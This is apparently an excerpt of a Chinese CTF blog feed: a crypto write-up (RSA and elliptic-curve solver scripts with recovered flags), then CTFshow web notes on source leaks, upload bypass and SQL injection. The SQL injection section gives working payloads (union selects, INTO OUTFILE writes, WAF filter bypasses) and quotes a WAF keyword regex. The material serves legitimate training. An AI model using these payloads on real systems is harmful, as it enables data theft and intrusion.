class="number">12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406</span></span><br><span class="line">p = <span class="number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span></span><br><span class="line">q = <span class="number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span></span><br><span class="line">e = <span class="number">0x1337</span></span><br><span class="line">cp = c % p</span><br><span class="line">mp = AMM(cp, e, p)</span><br><span class="line">p_proot = findAllPRoot(p, e)</span><br><span class="line">mps = findAllSolutions(mp, p_proot, cp, p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">m</span>):</span></span><br><span class="line">    <span class="keyword">if</span> long_to_bytes(m).decode(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;ignore&#x27;</span>).startswith(<span class="string">&#x27;*CTF&#x27;</span>):</span><br><span class="line">        print(long_to_bytes(m))</span><br><span class="line">        exit()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> long_to_bytes(m).decode(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;ignore&#x27;</span>).startswith(<span class="string">&#x27;*ctf&#x27;</span>):</span><br><span class="line">        print(long_to_bytes(m))</span><br><span class="line">        exit()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    check(<span class="built_in">int</span>(mpp))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#39;*CTF&#123;S0_Y0u_ARE_REA11Y_GOOd_At_Pla1_This&#125;Ifyoumissthetrainimonyouwillknowthatiamgoneyoucanheartheflagfluwwwwwwwwww&#39;</span><br></pre></td></tr></table></figure><blockquote><p>看这个flag好像又是歪打正着的一题….Pla1估计是某个方法吧?等个官方wp咯<br>还好padding长度不够hhhh, 不过要是长度够跑那个组合ART应该也是可以出结果的, 就是要多打两把游戏而已<br>顺便一提, 这个padding是歌词吧! 500 miles好听!</p></blockquote><h1 id="MyCurve"><a href="#MyCurve" class="headerlink" title="MyCurve"></a>MyCurve</h1><p>附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>]==<span class="string">&#x27;*CTF&#123;&#x27;</span> <span class="keyword">and</span> flag[-<span class="number">1</span>]==<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">flag=flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">P,Q</span>):</span></span><br><span class="line"><span class="keyword">if</span> Q==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> P</span><br><span class="line">x1,y1=P</span><br><span class="line">x2,y2=Q</span><br><span class="line"><span class="keyword">return</span> (d1*(x1+x2)+d2*(x1+y1)*(x2+y2)+(x1+x1^<span class="number">2</span>)*(x2*(y1+y2+<span class="number">1</span>)+y1*y2))/(d1+(x1+x1^<span class="number">2</span>)*(x2+y2)),(d1*(y1+y2)+d2*(x1+y1)*(x2+y2)+(y1+y1^<span class="number">2</span>)*(y2*(x1+x2+<span class="number">1</span>)+x1*x2))/(d1+(y1+y1^<span class="number">2</span>)*(x2+y2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">k,P</span>):</span></span><br><span class="line">Q=(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="keyword">while</span> k&gt;<span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> is_even(k):</span><br><span class="line">k/=<span class="number">2</span></span><br><span class="line">P=add(P,P)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">k-=<span class="number">1</span></span><br><span class="line">Q=add(P,Q)</span><br><span class="line"><span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line">F=GF(<span class="number">2</span>**<span class="number">100</span>)</span><br><span class="line">R.&lt;x,y&gt;=F[]</span><br><span class="line">d1=F.fetch_int(<span class="number">1</span>)</span><br><span class="line">d2=F.fetch_int(<span class="number">1</span>)</span><br><span class="line">x,y=(<span class="number">698546134536218110797266045394L</span>, <span class="number">1234575357354908313123830206394L</span>)</span><br><span class="line">G=(F.fetch_int(x),F.fetch_int(y))</span><br><span class="line">P=mul(bytes_to_long(flag),G)</span><br><span class="line"><span class="built_in">print</span> (G[<span class="number">0</span>].integer_representation(),G[<span class="number">1</span>].integer_representation())</span><br><span class="line"><span class="built_in">print</span> (P[<span class="number">0</span>].integer_representation(),P[<span class="number">1</span>].integer_representation())</span><br><span class="line"><span class="comment">#(698546134536218110797266045394L, 1234575357354908313123830206394L)</span></span><br><span class="line"><span class="comment">#(403494114976379491717836688842L, 915160228101530700618267188624L)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>椭圆曲线… 第一次做这样的<br>比赛的时候也没做出来 查了查<a href="https://www.hyperelliptic.org/">https://www.hyperelliptic.org</a>  (应该是一个曲线库<br>发现里面有一种曲线就是题目给的曲线<a href="https://www.hyperelliptic.org/EFD/g12o/auto-edwards.html">就是这个</a><br>具体是啥玩意还搞不懂 只能先按着库里面的数据把脚本写好 学完ECC再来看看了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">F=GF(<span class="number">2</span>**<span class="number">100</span>)</span><br><span class="line">R.&lt;x,y&gt;=F[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_map</span>(<span class="params">p</span>):</span></span><br><span class="line">    x,y = F.fetch_int(p[<span class="number">0</span>]),F.fetch_int(p[<span class="number">1</span>])</span><br><span class="line">    u = <span class="number">3</span>*(x+y)/(x*y+x+y)</span><br><span class="line">    v = <span class="number">3</span>*(x/(x*y+x+y)+<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> (u,v)</span><br><span class="line">G = (<span class="number">698546134536218110797266045394</span>,<span class="number">1234575357354908313123830206394</span>)P = (<span class="number">403494114976379491717836688842</span>,<span class="number">915160228101530700618267188624</span>)</span><br><span class="line">E = EllipticCurve(GF(<span class="number">2</span>**<span class="number">100</span>),[<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>])</span><br><span class="line">base = E(_map(G))</span><br><span class="line">res = E(_map(P))</span><br><span class="line">flag = discrete_log(res,base,base.order(),operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;总之就是吃老本&lt;br&gt;总之就是曲线好难&lt;br&gt;这次就差一道MyCurve…找个师傅学习学习再补充这个&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Crypto&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MyEnc&lt;/li&gt;
&lt;li&gt;GuessKey2&lt;/li&gt;
&lt;l</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="RSA" scheme="http://tearsjin.github.io/tags/RSA/"/>
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/tags/WriteUp/"/>
    
    <category term="ECC" scheme="http://tearsjin.github.io/tags/ECC/"/>
    
    <category term="lfsr" scheme="http://tearsjin.github.io/tags/lfsr/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow Web1000</title>
    <link href="http://tearsjin.github.io/2020/12/12/CTFshow-Web1000/"/>
    <id>http://tearsjin.github.io/2020/12/12/CTFshow-Web1000/</id>
    <published>2020-12-12T10:31:38.000Z</published>
    <updated>2021-03-13T04:44:53.710Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>重金买了个号怎么可能不做呢???<br>好好学学Web了 真的很重要!</p></blockquote><h1 id="信息搜集-Web1-20"><a href="#信息搜集-Web1-20" class="headerlink" title="信息搜集 Web1~20"></a>信息搜集 Web1~20</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web 1"></a>Web 1</h2><p>F12</p><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web 2"></a>Web 2</h2><p>没办法F12和右键了, 直接firefox开发者工具</p><h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web 3"></a>Web 3</h2><p>抓包, flag就在响应里</p><blockquote><p>所以有时候没思路就抓抓包, 有可能有线索或者提示的</p></blockquote><h2 id="Web-4"><a href="#Web-4" class="headerlink" title="Web 4"></a>Web 4</h2><p>robots.txt</p><blockquote><p>所以没思路的时候就阿巴阿巴</p></blockquote><h2 id="Web-5"><a href="#Web-5" class="headerlink" title="Web 5"></a>Web 5</h2><p>phps源码泄露</p><blockquote><p>有时候试试phps读源码, 有惊喜哦</p></blockquote><h2 id="Web-6"><a href="#Web-6" class="headerlink" title="Web 6"></a>Web 6</h2><p>也是源码泄露, 应该是备份压缩包<br>常见的名字有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39;www.zip&#39;,</span><br><span class="line">&#39;www.bak&#39;,</span><br><span class="line">&#39;www.rar&#39;,</span><br><span class="line">&#39;www.7z&#39;,</span><br><span class="line">&#39;www.tar&#39;,</span><br><span class="line">&#39;www.tar.gz&#39;,</span><br><span class="line">&#39;www.txt&#39;</span><br></pre></td></tr></table></figure><h2 id="Web-7"><a href="#Web-7" class="headerlink" title="Web 7"></a>Web 7</h2><h3 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h3><p>漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><p>一般来说就是.git泄露之后恢复源码什么的.</p><p>有时候还会需要用.git/config 中含有的access_token信息, 从而访问这个用户的其他仓库</p><p>有些时候访问.git会返回403, 这个时候就要试探的访问.git/config, 如果有内容返回, 就说明存在git泄露.</p><p>关于敏感目录泄露, 还有SVN泄露, HG泄露等等… 等以后遇到了再来总结</p><h2 id="Web-8"><a href="#Web-8" class="headerlink" title="Web 8"></a>Web 8</h2><h3 id="SVN-泄露"><a href="#SVN-泄露" class="headerlink" title="SVN 泄露"></a>SVN 泄露</h3><p>SVN(subversion)是一个源代码版本管理软件. 同样的隐藏文件.SVN里面会有信息. </p><p>利用seay-svn获取服务器源码等信息</p><h2 id="Web-9"><a href="#Web-9" class="headerlink" title="Web 9"></a>Web 9</h2><h3 id="vim备份文件泄露"><a href="#vim备份文件泄露" class="headerlink" title="vim备份文件泄露"></a>vim备份文件泄露</h3><p>当用户在用vim编辑文件但意外退出时, 会在当前目录下生成一个备份文件, 文件名格式为<code>.文件名.swp</code></p><p>针对swp备份文件, 可以用<code>vim -r</code>命令恢复文件的内容.</p><h2 id="Web-10"><a href="#Web-10" class="headerlink" title="Web 10"></a>Web 10</h2><p>Cookies里面有内容</p><blockquote><p>抓包分析的时候一般都会看看Cookies的</p></blockquote><h2 id="Web-11"><a href="#Web-11" class="headerlink" title="Web 11"></a>Web 11</h2><p>域名解析<br><a href="http://dbcha.com/">http://dbcha.com/</a> 里面查ctfshow.com的txt记录</p><blockquote><p>顺便学习一下域名解析的类型</p></blockquote><h3 id="域名解析类型-A-CNAME-MX-NS-TXT-AAAA-SRV-显性URL-隐性URL"><a href="#域名解析类型-A-CNAME-MX-NS-TXT-AAAA-SRV-显性URL-隐性URL" class="headerlink" title="域名解析类型: A/CNAME/MX/NS/TXT/AAAA/SRV/显性URL/隐性URL"></a>域名解析类型: A/CNAME/MX/NS/TXT/AAAA/SRV/显性URL/隐性URL</h3><p><strong>A记录</strong>：将域名指向一个IPv4地址（例如：10.10.10.10），需要增加A记录<br><strong>CNAME记录</strong>：如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录<br><strong>MX记录</strong>：建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录<br><strong>NS记录</strong>：域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录<br><strong>TXT记录</strong>：可任意填写（可为空），通常用做SPF记录（反垃圾邮件）使用<br><strong>AAAA记录</strong>：将主机名（或域名）指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA记录<br><strong>SRV记录</strong>：记录了哪台计算机提供了哪个服务。格式为：服务的名字.协议的类型（例如：_example-server._tcp）<br><strong>显性URL</strong>：将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址（例如：将<a href="http://www.net.cn显性转发到www.hichina.com后，访问www.net.cn时，地址栏显示的地址为：www.hichina.com）。">www.net.cn显性转发到www.hichina.com后，访问www.net.cn时，地址栏显示的地址为：www.hichina.com）。</a><br><strong>隐性URL</strong>：与显性URL类似，但隐性转发会隐藏真实的目标地址（例如：将<a href="http://www.net.cn隐性转发到www.hichina.com后，访问www.net.cn时，地址栏显示的地址仍然为：www.net.cn）。">www.net.cn隐性转发到www.hichina.com后，访问www.net.cn时，地址栏显示的地址仍然为：www.net.cn）。</a></p><h2 id="Web-12"><a href="#Web-12" class="headerlink" title="Web 12"></a>Web 12</h2><blockquote><p>开始变得奇怪了</p></blockquote><p>进去是一个购物网站, 抓包无果, 看了下robots.txt, 有提示/admin/<br>要输入账号密码, 账号就是admin, 密码是网站下面的那串数字</p><blockquote><p>正常情况下没有人会这么干吧!<br>所以还是要多去看看一下可以搜集信息的地方, robotx.txt啥的</p></blockquote><h2 id="Web-13"><a href="#Web-13" class="headerlink" title="Web 13"></a>Web 13</h2><p>拿到一个网站可以看看看看有哪些链接是可以跳转的(哪些是可以点击的)<br>网站下面有个document可以点, 进去以后里面有后台的地址和用户名密码.</p><h2 id="Web-14"><a href="#Web-14" class="headerlink" title="Web 14"></a>Web 14</h2><blockquote><p>KindEditor PHP编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录</p></blockquote><p>进入/editor/(这个得目录扫描吧… 利用上传图片遍历服务器根目录, 在网站目录下找到/nothinghere/fl000g.txt</p><h2 id="Web-15"><a href="#Web-15" class="headerlink" title="Web 15"></a>Web 15</h2><p>目录下有admin/<br>忘记密码需要填写密保<br>而网站下方有qq邮箱, 搜索qq可以知道密保答案</p><h2 id="Web-16"><a href="#Web-16" class="headerlink" title="Web 16"></a>Web 16</h2><p>考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针.</p><h2 id="Web-17"><a href="#Web-17" class="headerlink" title="Web 17"></a>Web 17</h2><p>利用ping 直接获得某个域名所对应的ip</p><h2 id="Web-18"><a href="#Web-18" class="headerlink" title="Web 18"></a>Web 18</h2><p>js代码审计, 找到游戏结果的判断就能找到线索</p><h2 id="Web-19"><a href="#Web-19" class="headerlink" title="Web 19"></a>Web 19</h2><p>AES加密, 但是Key iv mode padmode都在前端….<br>利用<a href="http://tool.chacuo.net/cryptaes%E8%A7%A3%E5%AF%86%E5%8D%B3%E5%8F%AF">http://tool.chacuo.net/cryptaes解密即可</a></p><h1 id="文件上传-web151-web170"><a href="#文件上传-web151-web170" class="headerlink" title="文件上传 web151 ~ web170"></a>文件上传 web151 ~ web170</h1><p>前端验证上传文件后缀名, 只需要抓包改一下文件名称就能上传后门了                                                                                                                        通过ls找到flag.php , cat flag.php即可</p><h1 id="sql注入-web171-web253"><a href="#sql注入-web171-web253" class="headerlink" title="sql注入 web171~ web253"></a>sql注入 web171~ web253</h1><h2 id="web-171"><a href="#web-171" class="headerlink" title="web 171"></a>web 171</h2><p>语句: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>直接在本表内爆出所有数据即可,  payload: <code>id= 1&#39; or 1 --+</code></p><h2 id="web-172"><a href="#web-172" class="headerlink" title="web 172"></a>web 172</h2><p>语句<code>$sql = &quot;select username,password from ctfshow_user2 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p><p>但是输出经过了过滤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if($row-&gt;username!&#x3D;&#x3D;&#39;flag&#39;)&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以需要把返回出来的username改掉, 让他检查不出来, payload: <code>1&#39; union select 1,password from ctfshow_user2 where username = &#39;flag&#39;  --+</code></p><h2 id="web-173"><a href="#web-173" class="headerlink" title="web 173"></a>web 173</h2><p>语句:<code>$sql = &quot;select id,username,password from ctfshow_user3 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p><p>返回逻辑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>这里直接对结果进行过滤, 需要让返回的结果不存在flag, 考虑将返回的结果全部转成十六进制</p><p>payload: <code>0&#39; union select 1,hex(username),hex(password) from ctfshow_user3 where username = &#39;flag&#39; --+</code></p><p>然后将返回的结果转成text即可,  但是出来flag的时候发现, 其实根本不需要转成16进制, 因为flag里根本就没有<code>flag</code>字样(ctfshow{3354c0bf-e7ab-4e26-9990-b5679766170d}), 所以直接<code>0&#39; union select 1,2,password from ctfshow_user3 where username = &#39;flag&#39; --+</code> 也能出结果</p><h2 id="web-174"><a href="#web-174" class="headerlink" title="web 174"></a>web 174</h2><p>语句: <code> $sql = &quot;select username,password from ctfshow_user4 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p><p>返回逻辑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>这下好了, 结果里连数字都不能出现了, hex(), base64()估计都不能用了, 想个办法把数字转成别的字符,  <code>replace(str1,str2,str3)</code> 可以把<code>str1</code>中的<code>str2</code>替换成<code>str3</code>, 可以考虑用这个将所有数字换成大写字母(毕竟flag中是没有大写字母的, 没有找到sql用正则的方法, 只能把多个replace()套在一起了</p><p>payload:<code>0&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#39;1&#39;,&#39;A&#39;),&#39;2&#39;,&#39;B&#39;),&#39;3&#39;,&#39;C&#39;),&#39;4&#39;,&#39;D&#39;),&#39;5&#39;,&#39;E&#39;),&#39;6&#39;,&#39;F&#39;),&#39;7&#39;,&#39;G&#39;),&#39;8&#39;,&#39;H&#39;),&#39;9&#39;,&#39;I&#39;),&#39;0&#39;,&#39;J&#39;) from ctfshow_user4 where username = &#39;flag&#39; --+</code></p><p>然后将返回的结果中的大写字母转回数字就行了</p><h2 id="web-175"><a href="#web-175" class="headerlink" title="web 175"></a>web 175</h2><p>语句:<code>$sql = &quot;select username,password from ctfshow_user5 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p><p>返回逻辑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;[\x00-\x7f]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>已经不能返回任何东西了, \x00~\x7f全部过滤掉了, 考虑文件的方式读取flag. 用<code>INTO OUTFILE</code> 可以将查询结果输出到某文件中, 在这里只需要输出到一个文件里就行了, 不过路径要记得写对<code>var\www\html\</code></p><p>payload: <code>1&#39; union select username,password from ctfshow_user5 where username=&#39;flag&#39; into outfile &#39;/var/www/html/res.txt&#39;--+</code></p><p>结果就在res.txt里</p><h2 id="web-176"><a href="#web-176" class="headerlink" title="web 176"></a>web 176</h2><p>开始有过滤了</p><p>语句:<code>$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p><p>返回逻辑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">   &#x2F;&#x2F;代码过于简单，不宜展示</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>只知道有过滤, 但不知道过滤了啥, 也没多想先试试<code>1&#39; or 1 --+</code>就出flag了, 看群主的视频这题应该是大小写绕过</p><h2 id="web-177"><a href="#web-177" class="headerlink" title="web 177"></a>web 177</h2><p>语句<code>$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code>                     </p><p>返回逻辑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">   &#x2F;&#x2F;代码过于简单，不宜展示</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>一样是过滤, 继续尝试<code>1&#39; or 1 --+</code>, 发现无结果, 应该是某些字符被过滤了. 这个时候因为不知道什么被过滤, 所以输入越少东西越能判断出过滤了什么.</p><p>先尝试<code>1&#39;--+</code> 发现无结果, 可能<code>--+</code>被过滤了, 尝试用<code>#</code> 也不行, 再试试<code>%23</code>, 发现可以绕过过滤</p><p>再尝试<code>1&#39; %23</code>又是无结果,明显是空格被过滤了, 利用<code>/**/</code>注释绕过空格.</p><p>于是得到一个payload: <code>1&#39;/**/or/**/1%23</code></p><h2 id="web-178-179"><a href="#web-178-179" class="headerlink" title="web 178 179"></a>web 178 179</h2><p>依旧是过滤掉了空格, 但是<code>/**/</code>不能使用了, 则尝试用括号来绕过</p><p>payload:<code>1&#39;or(1)%23</code> 简单粗暴</p><p>看了群主的视频发现还可以用<code>%09</code>来代替空格, 这个是制表符, 在sql中跟空格一样的作用</p><p>payload:<code>1&#39;%09or%091%23</code></p><p>然后在web 179里, <code>%09</code>也被过滤了, 第一个payload还是可以用的, 但还可以试试别的, 比如<code>%0a %0b %0c</code>等等, 把ascii码前面那几个字符都试一试, 试出<code>%0c</code>也是可以的</p><p>payload:<code>1&#39;%0cor%0c1%23</code> </p><h2 id="web-180"><a href="#web-180" class="headerlink" title="web 180"></a>web 180</h2><p>语句<code>$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p><p>跟前面的不同的是, 这次连<code>%23</code>都被过滤了, 可以说没办法注释掉后面的sql语句了, 只能通过闭合的方式使得语句不会出错</p><p>例如<code>1&#39;and&#39;a&#39;=&#39;a</code>, 这样语句就会变成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span><span class="keyword">and</span><span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;a&#x27;</span> limit <span class="number">1</span></span><br></pre></td></tr></table></figure><p>可以看到引号被成功的闭合, 结果也是有的. 但是, 想要查出flag还需要想办法使得<code>username != &#39;flag&#39;无效</code>, 因<code>username != &#39;flag&#39;</code>与后面的条件关系是<code>and</code>, 所以并不能通过他原本的语句中的<code>id=</code>查<code>id = 26</code>找到flag(id=26是flag是因为前面的题目都是26), 所以需要构造一个新的与前面的条件的关系为<code>or</code>的条件来查找</p><p>所以考虑了<code>1&#39;or(1)and&#39;a</code>, 但是得到的结果却只有一行, 原因是因为语句中有个<code>limit 1</code>. 而原本语句中的<code>id=1</code>是可以查询出结果的, 这里不能让他查询出结果了, 而出来的结果又必须是flag那一条, 所以考虑将<code>or</code>括号中的条件改成<code>id=26</code>. 这样就成功构造出payload:<code>0&#39;or(id=26)and&#39;a&#39;=&#39;a</code></p><h2 id="web-181"><a href="#web-181" class="headerlink" title="web 181"></a>web 181</h2><p>语句<code>$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></p><p>返回逻辑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select&#x2F;i&#39;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>web 180的payload中的字符串这题都没有过滤掉, 直接<code>0&#39;or(id=26)and&#39;a&#39;=&#39;a</code>出结果</p><h2 id="web-182"><a href="#web-182" class="headerlink" title="web 182"></a>web 182</h2><p>和web 181一样, 直接<code>0&#39;or(id=26)and&#39;a&#39;=&#39;a</code></p><h2 id="web-183"><a href="#web-183" class="headerlink" title="web 183"></a>web 183</h2><p>查询语句</p><figure class="highlight plain"><table><tr><td 